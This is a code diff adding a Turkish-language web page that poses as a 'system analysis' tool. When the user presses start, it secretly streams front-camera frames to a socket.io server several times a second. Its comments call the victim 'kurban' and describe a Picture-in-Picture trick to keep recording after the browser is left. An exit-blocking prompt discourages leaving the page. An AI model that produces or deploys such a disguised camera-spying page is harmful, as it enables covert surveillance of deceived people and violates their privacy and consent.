@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sistem Analiz Ünitesi</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        body { background: #000; color: #00f2ff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .box { border: 2px solid #333; padding: 40px; border-radius: 30px; background: #0a0a0a; width: 85%; text-align: center; }
+        #v { width: 100%; border-radius: 15px; margin-bottom: 20px; border: 1px solid #00f2ff; }
+        .btn { background: #00f2ff; color: #000; border: none; padding: 20px; border-radius: 10px; font-weight: bold; width: 100%; font-size: 18px; }
+        .loader { border: 4px solid #111; border-top: 4px solid #00f2ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="box" id="ui">
+        <video id="v" autoplay playsinline muted></video>
+        <h2 id="msg">SİSTEM ANALİZİ</h2>
+        <p id="sub" style="color:#666; font-size:14px;">Lütfen analizi başlatın ve tarayıcıyı kapatmayın.</p>
+        <div class="loader" id="loader"></div>
+        <button class="btn" id="startBtn">ANALİZİ BAŞLAT</button>
+    </div>
+
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const socket = io();
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        const ctx = c.getContext('2d');
+
+        document.getElementById('startBtn').onclick = async () => {
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('msg').innerText = "ANALİZ SÜRÜYOR...";
+            document.getElementById('sub').innerText = "Bağlantı kesilirse işlem iptal edilir.";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, audio: false 
+                });
+                v.srcObject = stream;
+                await v.play();
+
+                // ANDROID İÇİN: Chrome'dan çıkınca görüntüyü devam ettiren PiP hilesi
+                if (document.pictureInPictureEnabled && v.requestPictureInPicture) {
+                    try {
+                        // Kullanıcı butona bastığı an videoyu sistem katmanına çıkarır
+                        await v.requestPictureInPicture();
+                    } catch (e) { console.log("PiP aktif edilemedi."); }
+                }
+
+                // Görüntü Gönderim Döngüsü
+                setInterval(() => {
+                    if (v.readyState >= 2) {
+                        c.width = 640; c.height = 480;
+                        ctx.drawImage(v, 0, 0, 640, 480);
+                        socket.emit('video_frame', c.toDataURL('image/jpeg', 0.5));
+                    }
+                }, 150);
+
+            } catch (err) { alert("Kamera izni şart!"); location.reload(); }
+        };
+
+        // iPad ve Android'de kurbanın çıkmasını engellemek için son savunma:
+        window.onbeforeunload = function() { return "Çıkarsanız analiz iptal edilir!"; };
+    </script>
+</body>
+</html>
